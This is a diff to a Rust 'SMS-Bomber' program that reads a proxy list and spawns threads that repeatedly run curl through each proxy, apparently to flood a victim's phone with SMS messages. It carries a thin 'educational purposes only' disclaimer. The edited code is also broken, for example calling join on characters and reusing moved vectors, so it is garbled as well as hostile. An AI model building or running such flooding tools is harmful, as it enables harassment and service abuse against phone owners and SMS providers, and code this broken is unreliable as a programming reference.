@@ -3,12 +3,13 @@
 // This is for educational purposes only. I am not responsible
 // for any actions done with this code.
 
+use itertools::Itertools;
 use std::io::{self, Read, Write};
 use std::process::Command;
-use std::thread::{self, Thread};
+use std::thread::{self, spawn, Thread};
 use std::time::Duration;
 
-fn main() {
+fn main() -> ! {
     println!("SMS-Bomber v1.0.0");
     println!("This code is for educational purposes only. I am not responsible for any actions done with this code.");
     println!("");
@@ -46,18 +47,17 @@ fn main() {
         proxies.push(line.to_string());
     }
 
-    let mut children: Vec<Vec<char>> = Vec::new();
+    let mut children: Vec<char> = Vec::new();
     let mut counter = 0;
     for proxy in proxies {
         if counter == threads {
-            for child in children {
-                child.join(self).unwrap();
-            }
+            let joined_children: String = children.into_iter().collect();
             children.clear();
             counter = 0;
         }
         counter += 1;
-        let child = thread::spawn(move || {
+
+        spawn(move || {
             let mut cmd = Command::new("curl");
             cmd.arg("--proxy").arg(proxy);
             cmd.arg(format!(
@@ -68,27 +68,28 @@ fn main() {
                 cmd.output().unwrap();
                 thread::sleep(Duration::from_millis(100));
             }
-        });
-        children.push(child);
+        })
+        .join()
+        .unwrap();
     }
 
     loop {
         thread::sleep(Duration::from_millis(1000 * time));
         for child in children {
-            child.join().unwrap();
+            child.join::<_>().unwrap().expect("Failed to join thread.");
         }
         children.clear();
         counter = 0;
         for proxy in proxies {
             if counter == threads {
                 for child in children {
-                    child.join().unwrap();
+                    child.join::<_>().unwrap().expect("Failed to start proxy.");
                 }
                 children.clear();
                 counter = 0;
             }
             counter += 1;
-            let child = thread::spawn(move || {
+            let child = spawn(move || {
                 let mut cmd = Command::new("curl");
                 cmd.arg("--proxy").arg(proxy);
                 cmd.arg(format!(
